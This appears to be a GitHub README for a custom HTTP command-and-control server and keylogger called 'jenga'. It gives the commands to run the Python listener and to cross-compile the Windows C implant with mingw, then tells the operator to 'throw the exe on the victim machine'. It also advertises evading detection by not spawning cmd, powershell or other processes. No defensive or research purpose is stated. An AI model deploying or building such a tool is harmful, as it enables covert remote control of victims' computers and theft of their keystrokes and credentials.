# Custom C2 and Keylogger
HTTP C2 without creating any cmd, powershell or processes   
## Listener
Change the IP and PORT in the file and then run below command in your linux
```
rlwrap python jenga_server.py
```

## Victim
Change the IP and URL in the file and then compile with below command in linux 
```
x86_64-w64-mingw32-gcc jenga.c -o jenga.exe -lwsock32 -w
```
Then throw the exe on the victim machine


This is how exe works:


![arch](https://user-images.githubusercontent.com/45479002/205278255-a2782616-6b90-4a6a-af80-c329653c7889.png)


![poc_for_github](https://user-images.githubusercontent.com/45479002/205272116-fa17a9b3-2ba2-4f3b-8d4d-2c5ef19b8370.png)
